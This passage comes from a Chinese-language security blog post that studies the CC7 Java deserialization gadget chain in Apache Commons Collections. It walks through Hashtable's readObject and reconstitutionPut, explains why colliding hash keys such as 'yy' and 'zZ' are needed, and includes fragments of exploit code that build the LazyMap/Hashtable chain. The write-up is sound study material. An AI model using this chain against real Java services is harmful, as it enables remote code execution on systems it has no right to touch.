iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化  --&gt;  反序列化（hashtable）</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>嗯 </p>
+<p>注意这里的 <strong>“yy” “zZ” 是不能更改的</strong> 是hash计算出的结果 我最开始以为是随便加的 更改了导致不能调出计算器 这个我们后面会说</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5ba35f6.png" alt="image-20240605211746861"></p>
+<h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>从思路上来说，我个人觉得CC7利用链更像是从CC6利用链改造而来，只不过是CC7链没有使用HashSet，而是使用了<strong>Hashtable</strong>来构造新的利用链</p>
+<ul>
+<li><p>使用Transformer数组来构造利用代码，然后通过反射将transformers数组设置给ChaniedTransformer类的iTransformers属性，这一步和CC6利用链的构造思路上基本一致，没什么好说的。</p>
+</li>
+<li><p>在构造利用链时，CC7仍然使用了LazyMap来构造利用链，不同的是，CC7使用了新的链Hashtable来触发LazyMap利用链，最终执行核心利用代码。</p>
+</li>
+</ul>
+<p>我们重点来看Hashtable是如何构造利用链的</p>
+<p>先来看Hashtable序列化过程(writeObject)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b48d51.png" alt="image-20240605220125218"></p>
+<p>Hashtable有一个<code>Entry&lt;?,?&gt;[]</code>类型的table属性，并且还是一个数组，用于存放元素（键值对)。Hashtable在序列化时会先把table数组的容量写入到序列化流中，再写入table数组中的元素个数，然后将table数组中的元素取出写入到序列化流中。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c237f7.png" alt="image-20240605223734999"></p>
+<p>我们再回头看Hashtable的反序列化流程(readObject)：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c0e14c.png" alt="image-20240605233043585"></p>
+<p>截不完 </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到：</p>
+<p>Hashtable会先从反序列化流中读取table数组的容量和元素个数，并根据origlength 和elements 计算出table数组的length，再根据计算得到的length来创建table数组（origlength 和elements可以决定table数组的大小），然后从反序列化流中依次读取每个元素，然后调用reconstitutionPut方法将元素重新放入table数组（Hashtable的table属性），最终完成反序列化。</p>
+<p>这里唯一不知道的就是<code>reconstitutionPut</code>方法 我们点进去看下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5be793a.png" alt="image-20240605234112818"></p>
+<p>它首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在tab数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中</p>
+<p>而CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在<strong>判断重复元素的时候校验了两个元素的hash值是否一样</strong>，然后接着<strong>key会调用equals方法判断key是否重复时就会触发漏洞</strong></p>
+<p>e.key.equals()调用了LazyMap的equals方法，但是LazyMap中并没有equals方法，实际上是调用了LazyMap的父类<code>AbstractMapDecorator</code>的equals方法，虽然AbstractMapDecorator是一个抽象类，但它实现了equals方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5abb491.png" alt="image-20240607193313805"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b7b77f.png" alt="image-20240607201041534"></p>
+<p><strong>注</strong>：在添加第一个元素时并不会进入if语句调用equals方法进行判断，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞</p>
+<p>因为其中 <strong>if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key))</strong>, 存在着一个短路，就是如果 <strong>e.hash!&#x3D;hash</strong> 的话会直接返回 false, 就不会执行到我们想要的 <strong>e.key.equals</strong></p>
+<p>好 我们再来看 e 是哪里来的，**e &#x3D; tab[index]**，我们一路追踪，发现 table 是从 readObject 跟进来的一个新 Entry</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5adfac2.png" alt="image-20240607194358833"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c0cd48.png" alt="image-20240607195400775"></p>
+<p>但是它并没有设置 hash 这种东西，所以我们只能从这里下手</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b45e06.png" alt="image-20240607200300450"></p>
+<p>这里有hash 可以来创建 它会根据我们传入的 map 的来创建一个和当前 map 存在相同 hash 的一个 entry</p>
+<p>好 我们继续分析链子</p>
+<p>回到<code>AbstractMapDecorator</code>的equals方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b11b4f.png" alt="image-20240607201135075"></p>
+<p><code>AbstractMapDecorator</code>类的equals方法只比较了这两个key的引用，如果不是同一对象会再次调用equals方法，map属性是通过LazyMap传递的，我们在构造利用链的时候，通过LazyMap的静态方法decorate将HashMap传给了map属性，因此这里会调用HashMap的equals方法。</p>
+<p>但是HashMap中并没有找到一个名字为equals的成员方法，但是通过分析发现HashMap继承了AbstractMap抽象类，该类中有一个equals方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5d59d79.png" alt="image-20240607202001366"></p>
+<p>抽象类AbstractMap的equals方法进行了更为复杂的判断：</p>
+<ul>
+<li><p>判断是否为同一对象</p>
+</li>
+<li><p>判断对象的运行类型</p>
+</li>
+<li><p>判断Map中元素的个数</p>
+</li>
+</ul>
+<p>当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容，虽然对象o向上转型成Map类型，但是m对象本质上是一个LazyMap。因此<strong>m对象调用get</strong>方法时实际上是调用了LazyMap的get方法。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b35f71.png" alt="image-20240607202627018"></p>
+<p>调到了get的话链子其实就通了</p>
+<p>调用流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashtable.readObject-&gt;</span><br><span class="line">	Hashtable.reconstitutionPut-&gt;</span><br><span class="line">		AbstractMapDecorator.equals-&gt;</span><br><span class="line">			AbstractMap.equals-&gt;</span><br><span class="line">				...</span><br></pre></td></tr></table></figure>
+
+<p>后续其实就一样了—沿着 LazyMap.get () 方法继续往下写的</p>
+<h2 id="细节处理"><a href="#细节处理" class="headerlink" title="细节处理"></a>细节处理</h2><h3 id="为什么要hash值相同"><a href="#为什么要hash值相同" class="headerlink" title="为什么要hash值相同"></a>为什么要hash值相同</h3><p>其实几乎就是我们上面<code>注</code>里写的 一模一样 </p>
+<p><strong>我这里复制下来 继续分析</strong></p>
+<p>其中 <strong>if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key))</strong>, 存在着一个短路，就是如果 <strong>e.hash!&#x3D;hash</strong> 的话会直接返回 false, 就不会执行到我们想要的 <strong>e.key.equals</strong></p>
+<p>好 我们再来看 e 是哪里来的，**e &#x3D; tab[index]**，我们一路追踪，发现 table 是从 readObject 跟进来的一个新 Entry</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5adfac2.png" alt="image-20240607194358833"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c0cd48.png" alt="image-20240607195400775"></p>
+<p>但是它并没有设置 hash 这种东西，所以我们只能从这里下手</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b45e06.png" alt="image-20240607200300450"></p>
+<p>这里有hash 可以来创建 它会根据我们传入的 map 的来创建一个和当前 map 存在相同 hash 的一个 entry</p>
+<p>我们在回头来看 <code>readObject</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5d1e556.png" alt="image-20240607204126437"></p>
+<p>重点看下这个for循环</p>
+<p>他将 Hashtable 中的所有 map 都甩进了 reconstitutionPut 方法一次</p>
+<p>我们需要甩两个 LazyMap 进 Hashtable 中，这样才能正常的进入我们想要的 equals 方法</p>
+<p>这样就有了：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里两个 map 的 key 值和 value 值不能同时相同，同时相同则无法进入 if 判断，因为在 readObject 中 element 计算会把两个 map 计算为只有一个 map，从而只进行一次循环</p>
+</blockquote>
+<p>在 Java 中 zZ 和 yy 的 hash 值相同，所以就拿这两个来进行比较</p>
+<p>为什么这两个LazyMap的hash值是一样的？继续跟踪hash方法，发现当LazyMap调用hashCode方法，实际上会调用AbstractMap抽象类的hashCode方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5b99ffc.png" alt="image-20240607205106642"></p>
+<p>AbstractMap抽象类的hashCode方法实际调用了HashMap中的元素（yy&#x3D;1）的hashCode方法，准确来说是Node节点的hashCode方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c64072.png" alt="image-20240607205238318"></p>
+<p>Node类调用了Objects类的hashCode静态方法计算key和value的hash值，然后再进行异或运算得到一个新的hash值</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5ccd87f.png" alt="image-20240607205607320"></p>
+<p>继续跟进Objects类的hashCode静态方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5caf393.png" alt="image-20240607205741486"></p>
+<p>到这我们基本可以知道，实际上底层调用了字符串“yy”的包装类String的hashCode方法，hashCode方法通过字符的<strong>ascii码值</strong>计算得到一个3872的hash值。</p>
+<p>hash计算过程：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5bb2a78.png" alt="image-20240607210154046"></p>
+<p>第一次计算的时候val[i]的值是小写字母y，y的ascii码值就是121，h值为121。</p>
+<p>第二次计算的时候val[i]的值是还是小写的字母y，h的值为3872&#x3D;31*121+121，最终得到hash值为3872。</p>
+<p>然后返回到Node类中的hashCode方法，进行亦或运算得到一个3873新的hash值并返回到AbstractMap类的hashCode方法中，最终lazyMap1的hash值就是3873</p>
+<p><strong>其他的同理</strong></p>
+<p>所以hash(yy)&#x3D;hash(zZ)</p>
+<p>lazyMap中元素的key值是经过精心构造的，其目的就是为了构造两个hash值相同的key，从而触发漏洞</p>
+<p>其实key的字符串是可以替换的，但key中的字符串的hash值必须相同，例如把key的字符串改成以下值同样也可以触发漏洞</p>
+<p>hash(Ea)&#x3D;hash(FB)</p>
+<h3 id="第二个元素（yy-yy）从何而来"><a href="#第二个元素（yy-yy）从何而来" class="headerlink" title="第二个元素（yy&#x3D;yy）从何而来"></a>第二个元素（yy&#x3D;yy）从何而来</h3><p>我们可以看到Hashtable在添加第二个元素时，lazyMap2集合会“莫名其妙”添加一个元素（yy-&gt;yy）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5c8178c.png" alt="image-20240607210948770"></p>
+<p>这其实是Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法添加一个元素（yy-&gt;yy）</p>
+<p>例如Hashtable调用<strong>put方法</strong>添加第二个元素（lazyMap2，1）的时候，该方法内部会调用equals方法根据元素的key判断是否为同一元素</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5bd2e1a.png" alt="image-20240607211129313"></p>
+<p>此时的key是lazyMap2对象，而lazyMap2实际上调用了AbstractMap抽象类的equals方法，equals方法内部会调用lazyMap2的get方法判断table数组中元素的key在lazyMap2是否已存在，如果不存在，transform会把当前传入的key返回作为value，然后lazyMap2会调用put方法把key和value（yy&#x3D;yy）添加到lazyMap2。</p>
+<p>当在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，<strong>会判断Map中元素的个数</strong>，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。</p>
+<p>回到AbstractMap.equals</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630b5d0b8df.png" alt="image-20240607211636416"></p>
+<p>因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素（yy-&gt;yy）才能触发漏洞。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>好 CC7差不多就这样吧</p>
+<p>其实整个CC链还是有点不熟 应该还要再花点时间来总结沉淀一下</p>
+<p>会写一个总结的</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/')">java反序列化--CC7</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=java反序列化--CC7&amp;url=http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/java%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java安全<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/java/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>学习<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/CC%E9%93%BE/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CC链<span class="tagsPageCount">7</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java反序列化--CC6</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JAVA加载字节码</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/" title="java反序列化--CC1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC1</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/" title="java反序列化--CC5"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont 